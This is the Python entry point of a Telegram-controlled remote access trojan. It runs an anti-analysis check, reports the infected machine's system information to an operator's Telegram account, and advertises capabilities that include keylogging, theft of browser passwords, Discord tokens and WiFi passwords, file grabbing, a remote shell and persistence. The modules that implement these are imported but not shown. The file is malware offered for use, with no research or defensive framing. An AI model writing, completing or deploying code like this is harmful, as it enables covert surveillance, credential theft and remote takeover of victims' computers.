"""Telegram RAT entry point."""
import sys
import os

# Ensure modules package is importable
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.main import bot, ADMIN_ID
from modules.anti import anti_analysis
from modules.main import sysinfo, main_kb
import logging

log = logging.getLogger("rat")

if __name__ == "__main__":
    anti_analysis()
    try:
        info = sysinfo()
        caps = (
            "Capabilities:\n"
            "- System info + geo\n"
            "- Screenshot / Webcam\n"
            "- Keylogger (ON/OFF/Dump)\n"
            "- Passwords (Chrome/Edge/Brave/Opera/Vivaldi/Yandex + ABE)\n"
            "- Discord tokens\n"
            "- WiFi passwords\n"
            "- Clipboard monitor\n"
            "- File grabber\n"
            "- Remote shell\n"
            "- Download / Upload\n"
            "- Message box\n"
            "- Persistence\n"
            "- Self-destruct"
        )
        bot.send_message(ADMIN_ID, f"online\n{info}\n\n{caps}", reply_markup=main_kb())
    except Exception as e:
        log.warning("startup message failed: %s", e)
    bot.infinity_polling(timeout=90, long_polling_timeout=90, interval=7)
